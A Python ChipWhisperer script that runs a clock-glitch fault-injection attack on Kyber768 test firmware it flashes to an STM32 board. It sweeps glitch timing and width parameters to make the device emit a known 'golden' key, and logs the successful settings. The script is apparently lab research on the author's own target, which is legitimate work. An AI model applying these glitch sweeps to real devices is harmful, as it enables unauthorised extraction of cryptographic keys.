#!/usr/bin/env python3
"""
Kyber768 Instruction Skip Attack - V5 GLITCH_ONLY MODE
Try glitch_only mode instead of enable_only
Also try both positive and negative widths
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys

FW_PATH = "bin/test_glitch.hex"

# Focus on golden ext_offset=17 area with different width approach
EXT_OFFSET_RANGE = range(10, 30)    # Focus around golden
WIDTH_RANGE = list(range(-20, -5)) + list(range(5, 20))  # Include negative widths
OFFSET_RANGE = range(-25, 0)

def setup_scope_and_target():
    print("Connecting to ChipWhisperer...", flush=True)
    try:
        scope = cw.scope()
        target = cw.target(scope)
    except Exception as e:
        print(f"Connection failed: {e}", flush=True)
        return None, None
    
    scope.default_setup()
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    # GLITCH_ONLY MODE - more aggressive than enable_only
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "glitch_only"  # Alternative voltage mode
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    scope.glitch.repeat = 3  # Triple pulse
    
    print("MODE: glitch_only + repeat=3", flush=True)
    
    return scope, target

def reset_target(scope, target):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.1)
    target.flush()

def do_glitch(scope, target, target_key, ext_offset, width, offset):
    scope.glitch.ext_offset = ext_offset
    scope.glitch.width = width
    scope.glitch.offset = offset
    
    target.flush()
    
    result = ""
    start = time.time()
    while (time.time() - start) < 0.3:
        if target.in_waiting():
            result += target.read()
            if "WAIT" in result:
                break
        time.sleep(0.005)
    
    if "WAIT" not in result:
        return "timeout", None
    
    scope.arm()
    ret = scope.capture()
    
    if ret:
        return "no_trigger", None
    
    response = ""
    start = time.time()
    while (time.time() - start) < 0.3:
        if target.in_waiting():
            response += target.read()
            if "KEY:" in response and "\n" in response[response.find("KEY:"):]:
                break
        time.sleep(0.005)
    
    if target_key in response:
        return "SUCCESS", scope.get_last_trace()
    elif "KEY:" in response:
        return "normal", None
    else:
        return "crash", None

def main():
    scope, target = setup_scope_and_target()
    if not scope:
        return
    
    print(f"Programming {FW_PATH}...", flush=True)
    try:
        cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
        print("Programming successful!", flush=True)
    except Exception as e:
        print(f"Programming failed: {e}", flush=True)
        scope.dis()
        return
    
    reset_target(scope, target)
    time.sleep(0.5)
    
    all_output = ""
    start_time = time.time()
    while time.time() - start_time < 3:
        if target.in_waiting():
            all_output += target.read()
        time.sleep(0.02)
    
    if "GOLD:" not in all_output:
        print("ERROR: No GOLD key!", flush=True)
        scope.dis()
        return
    
    idx = all_output.index("GOLD:") + 5
    remaining = all_output[idx:].strip()
    target_key = remaining.split()[0] if remaining else None
    
    if not target_key or len(target_key) < 32:
        print(f"ERROR: Invalid key", flush=True)
        scope.dis()
        return
    
    print(f"Target Key: {target_key}", flush=True)
    print("="*60, flush=True)
    print("ATTACK V5 - glitch_only MODE", flush=True)
    print(f"ext_offset: {EXT_OFFSET_RANGE.start}-{EXT_OFFSET_RANGE.stop-1}", flush=True)
    print(f"width: negative AND positive", flush=True)
    print(f"offset: {OFFSET_RANGE.start} to {OFFSET_RANGE.stop-1}", flush=True)
    print(f"repeat: 3 (triple pulse)", flush=True)
    print("="*60, flush=True)
    
    os.makedirs("traces_repro", exist_ok=True)
    
    total = 0
    crashes = 0
    timeouts = 0
    normal = 0
    success_found = False
    
    try:
        for ext_offset in EXT_OFFSET_RANGE:
            for width in WIDTH_RANGE:
                for offset in OFFSET_RANGE:
                    for rep in range(3):
                        total += 1
                        
                        result, trace = do_glitch(scope, target, target_key, ext_offset, width, offset)
                        
                        if result == "SUCCESS":
                            print(f"\n\n{'='*60}", flush=True)
                            print("SUCCESS! glitch_only WORKED!", flush=True)
                            print(f"ext_offset={ext_offset}, width={width}, offset={offset}", flush=True)
                            print(f"Total: {total}", flush=True)
                            print(f"{'='*60}", flush=True)
                            
                            np.save(f"traces_repro/SUCCESS_v5_e{ext_offset}_w{width}_o{offset}.npy", trace)
                            with open("KYBER_SUCCESS_V5.txt", "w") as f:
                                f.write(f"MODE=glitch_only\n")
                                f.write(f"ext_offset={ext_offset}\n")
                                f.write(f"width={width}\n")
                                f.write(f"offset={offset}\n")
                                f.write(f"repeat=3\n")
                                f.write(f"attempts={total}\n")
                                f.write(f"key={target_key}\n")
                            
                            success_found = True
                            break
                        
                        elif result == "crash" or result == "no_trigger":
                            crashes += 1
                            if crashes % 15 == 0:
                                reset_target(scope, target)
                                time.sleep(0.15)
                        elif result == "normal":
                            normal += 1
                        else:
                            timeouts += 1
                            if timeouts % 10 == 0:
                                reset_target(scope, target)
                                time.sleep(0.15)
                    
                    if success_found:
                        break
                    
                    if total % 100 == 0:
                        crash_pct = crashes / total * 100 if total > 0 else 0
                        sys.stdout.write(f"\rV5: {total} | e={ext_offset},w={width},o={offset} | Crash:{crashes}({crash_pct:.0f}%) Norm:{normal} TO:{timeouts}")
                        sys.stdout.flush()
                
                if success_found:
                    break
            if success_found:
                break
        
        if not success_found:
            print(f"\nNo success after {total} attempts.", flush=True)
            print(f"Crashes:{crashes} Normal:{normal} Timeouts:{timeouts}", flush=True)
    
    except KeyboardInterrupt:
        print(f"\nInterrupted at {total}", flush=True)
    
    finally:
        scope.dis()
        target.dis()

if __name__ == "__main__":
    main()
